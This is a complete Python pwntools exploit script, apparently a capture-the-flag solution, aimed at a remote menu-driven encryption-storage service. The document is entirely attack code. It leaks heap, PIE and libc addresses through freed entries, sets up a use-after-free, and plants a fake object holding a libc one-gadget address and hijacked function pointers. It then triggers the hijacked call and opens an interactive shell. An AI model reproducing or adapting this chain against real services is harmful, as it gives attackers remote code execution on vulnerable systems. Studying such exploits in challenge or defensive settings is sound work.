#!/usr/bin/env python3
from pwn import *

r = remote(sys.argv[1], int(sys.argv[2], 10))
libc = ELF("./libc.so.6")

one_shots = [0xe6b93, 0xe6b96, 0xe6b99, 0x10af39]

def create_entry():
    r.sendlineafter(b"> ", b"1")

def get_entry(idx):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", str(idx).encode())

def del_entry(idx):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b": ", str(idx).encode())

def view_entries():
    r.sendlineafter(b"> ", b"4")
    data = r.recvuntil(b"++")[:-3]
    return data

def save_data(enc, keySize, key, dataSize, data):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", str(enc).encode())
    r.sendlineafter(b": ", str(keySize).encode())
    r.sendlineafter(b": ", key.hex())
    r.sendlineafter(b": ", str(dataSize).encode())
    r.sendlineafter(b": ", data.hex())

def view_data():
    r.sendlineafter(b"> ", b"2")
    r.recvuntil(b"{!} Your data:")
    data = r.recvline().strip()
    return data

def redact_data(offset, size, data):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b": ", str(offset).encode())
    r.sendlineafter(b": ", str(size).encode())
    r.sendlineafter(b": ", data.hex())

def delete_data(offset, size, data):
    r.sendlineafter(b"> ", b"4")

def exit_to_main_menu():
    r.sendlineafter(b"> ", b"5")

create_entry() # 0
exit_to_main_menu()
create_entry() # 1
save_data(1, 2, b"ab", 1024, b"kekw")
exit_to_main_menu()
create_entry() # 2
save_data(2, 2, b"ab", 2, b"ba")
exit_to_main_menu()

del_entry(0)
del_entry(1)

get_entry(1)
data = view_data()
exit_to_main_menu()

chunks = [u64(b''.fromhex(data[i:i+16].decode())) for i in range(0, len(data), 16)]
heap_base = chunks[1] - 0x10
pie = chunks[33] - 0x38c1
libc = chunks[46] - 0x1eabe0

print("[+] heap: {}".format(hex(heap_base)))
print("[+] pie: {}".format(hex(pie)))
print("[+] libc: {}".format(hex(libc)))

# make UAF
create_entry() # 3
save_data(2, 0x760, b"a", 0x10, b"b")
exit_to_main_menu()

create_entry() # 4
save_data(2, 0x10, b"a", 0x20, b"b")
exit_to_main_menu()

del_entry(3)
del_entry(4)

create_entry() # 5
fake_data_object = p64(libc+one_shots[3]) # data ptr
fake_data_object += p64(0x0) # key ptr
fake_data_object += p32(0x1) # key size
fake_data_object += p32(0x10) # data size
fake_data_object += p32(0x1) # used
fake_data_object += p32(0xff) # idx
fake_data_object += p64(0x1) # algo type
fake_data_object += p64(pie+0x00000000000027cd) + p64(pie+0x00000000000027cd) # enc, dec functions

save_data(2, 0x38, fake_data_object, 0x10, b"b")
exit_to_main_menu()

get_entry(3)
redact_data(0, 1, b'a')

r.interactive()
